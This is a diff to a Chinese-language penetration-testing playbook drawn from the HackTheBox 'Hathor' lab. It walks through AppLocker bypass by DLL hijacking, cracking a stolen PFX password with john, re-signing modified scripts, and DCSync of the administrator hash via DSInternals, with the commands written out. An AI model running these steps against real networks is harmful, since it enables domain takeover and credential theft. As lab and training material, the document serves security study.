@@ -41,7 +41,7 @@ SMB 侧两个先验（来自 Nmap 与 nxc）：`Message signing enabled and requ
 
 ## 3. DLL 劫持四步法
 
-**① 找点**：可写目录 × 被加载的文件 × 在 AppLocker 白名单里。典型形态是"同名脚本 + DLL 同目录"（脚本 `DllOpen` 加载）、服务/计划任务 exe 的同目录 DLL。
+**① 找点**：可写目录 × 被加载的文件 × 在 AppLocker 白名单里。典型形态是"同名脚本 + DLL 同目录"（脚本里 `DllOpen` 加载该 DLL；本案取自 0xdf writeup 对 `7Zip.au3` 源码的引用确认 + 我们自己行为确认 DLL 确实被加载）。
 
 **② 写探针矩阵**（同一份字节、只换扩展名，逐个写入）：
 
@@ -95,11 +95,12 @@ file target.dll && ls -l target.dll                          # 自检：PE32+ DL
 **② 破口令**（Kali 无 `crackpkcs12` 包，改用 john）：
 
 ```bash
-apt install -y john python3-asn1crypto
+apt install -y john                      # john 需带 jumbo 补丁（Kali 自带）；pfx2john.py 依赖 asn1crypto
+python3 -c "import asn1crypto" || python3 -m pip install --user asn1crypto   # 缺依赖时按脚本自身提示装
 python3 /usr/share/john/pfx2john.py stolen.pfx > pfx.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash && john --show pfx.hash
 ```
-HTB-Hathor 实测：弱口令，秒出。
+来源：HTB-Hathor 实测（弱口令，秒出）。依赖依据：`pfx2john.py` 源码在缺 asn1crypto 时会报 `asn1crypto is missing, run 'pip install --user asn1crypto'`。
 
 **③ 重签**（两条路）：
 
@@ -117,8 +118,8 @@ Set-AuthenticodeSignature -FilePath C:\path\target.ps1 -Certificate $cert | Form
 osslsigncode sign -pkcs12 stolen.pfx -pass '<pfx 口令>' -h sha256 -in mod.ps1 -out signed.ps1
 ```
 
-**④ 内联执行不受脚本规则约束**：AppLocker 的 Script 规则约束的是**被脚本宿主启动的脚本文件**；`powershell -nop -c "…"` 这类内联命令不落地脚本文件，因此不受该规则限制（**本案实测**：机内重签动作正是用内联 `-c` 完成，并成功取得 `Status : Valid`）。
-> 顺带：`dot-source` / `Import-Module` 加载的 `.ps1`/`.psm1` 不是"被启动的脚本"，理论上同样不受限 —— 这一条属**推断，本案未实测**（本案改的是主脚本本体）。
+**④ 内联执行不受脚本规则约束**：AppLocker 的 Script 规则**只涵盖脚本文件格式**——微软《[Script rules in AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/script-rules-in-applocker)》原文列出的是 `.ps1 .bat .cmd .vbs .js` 这些**文件**；`powershell -nop -c "…"` 这类内联命令不落地上述任何文件格式，因此不在该规则管辖内（**本案实测**：机内重签动作正是用内联 `-c` 完成，并成功取得 `Status : Valid`）。
+> 顺带：`dot-source` / `Import-Module` 加载的 `.ps1`/`.psm1` 并非"被脚本宿主以文件形式启动"，理论上同样不受限 —— 这一条属**推断，本案未实测**（本案改的是主脚本本体）。
 
 **⑤ 触发**：改脚本 → 重签 → 触发**原本就会运行该脚本的计划任务**。HTB-Hathor 的形态：`run.vbs` 用 `eventcreate` 写一条 Event ID `444`，计划任务监听该事件、以**另一个高权账号**执行审计脚本 —— 于是我们借"签名过 + 高权上下文"的脚本拿到了下一个域身份。
 
@@ -144,14 +145,14 @@ if (reason == DLL_PROCESS_ATTACH) {
 ## 7. 从域内 Windows 主机做 DCSync，以及 NTLM 禁用时的取票
 
 ```powershell
-Import-Module DSInternals -ErrorAction SilentlyContinue
-"IDENTITY: $(whoami)" | Out-File -Encoding utf8 C:\Programdata\dc.txt        # 先自证身份
+"IDENTITY: $(whoami)" | Out-File -Encoding utf8 C:\Programdata\dc.txt        # 先自证执行身份
+Import-Module DSInternals
 Get-ADReplAccount -SamAccountName administrator -Server <DC FQDN> 2>&1 | Out-File -Append -Encoding utf8 C:\Programdata\dc.txt
-Get-ADReplAccount -SamAccountName krbtgt       -Server <DC FQDN> 2>&1 | Out-File -Append -Encoding utf8 C:\Programdata\dc.txt
 Copy-Item C:\Programdata\dc.txt C:\<可读共享>\dc.txt -Force                  # 回抄便于取回
 ```
+> 本节只保留"在执行受限主机上怎么落地"的形态；**cmdlet 参数、输出字段解读、与 KrbRelay 的分界见 `ad-post-compromise.md` §2.8**（避免两处重复维护）。
 
-- 前提：运行账号具备 `Replicating Directory Changes` / `...All`。**本案实测**：该审计工具（Get-bADpasswords）的运行账号即具备 —— 工具本身就是靠复制协议读取密码哈希，所以"先拿审计类工具的运行账号"通常是这条路的入口；是否普遍成立以该工具的 README 为准。
+- 前提：运行账号具备 `Replicating Directory Changes` / `...All`。**本案实测**：该审计工具（Get-bADpasswords）的运行账号即具备 —— 工具本身就是靠复制协议读取密码哈希，所以"先拿审计类工具的运行账号"通常是这条路的入口；是否普遍成立以该工具的 README 为准。AD 侧细节（与 §5.5 KrbRelay 的分界、输出字段解读）见 `ad-post-compromise.md` §2.8。
 - 输出含 `NTHash`、`NTHashHistory` 与 `KerberosNew.AES256/AES128 Key`（本案实测输出形态）。**RC4 被禁时用 AES key 走 keytab/`ktutil` 取票**——此路为备用方案，**本案未实测**（本案 RC4 可用，`getTGT -hashes` 一次成功）。
 - 结果先写 `C:\Programdata` 再回抄共享，避免依赖交互 shell（对"没有稳定 shell"的场景尤其重要）。
 - **NTLM 禁用 ⇒ 不能 Pass-the-Hash**，改走 overpass-the-hash：
